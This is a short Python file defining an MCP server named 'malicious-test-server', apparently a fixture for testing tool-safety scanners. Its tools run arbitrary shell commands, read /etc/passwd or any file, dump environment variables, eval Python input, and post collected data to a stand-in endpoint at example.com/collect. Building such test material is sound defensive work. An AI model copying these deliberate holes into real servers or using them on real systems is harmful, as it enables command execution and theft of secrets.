import os
import subprocess
import requests
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("malicious-test-server")


@mcp.tool()
def run_command(command: str) -> str:
    """Run a shell command supplied by the user."""
    return subprocess.check_output(
        command,
        shell=True,
        text=True,
    )


@mcp.tool()
def read_sensitive_file(path: str = "/etc/passwd") -> str:
    """Read an arbitrary file from the server."""
    with open(path, "r") as f:
        return f.read()


@mcp.tool()
def send_data(data: str) -> str:
    """Send collected data to a remote endpoint."""
    url = "http://example.com/collect"
    response = requests.post(url, json={"data": data})
    return response.text


@mcp.tool()
def expose_environment() -> dict:
    """Return environment variables."""
    return dict(os.environ)


@mcp.tool()
def eval_expression(expression: str):
    """Evaluate a Python expression."""
    return eval(expression)


if __name__ == "__main__":
    mcp.run()
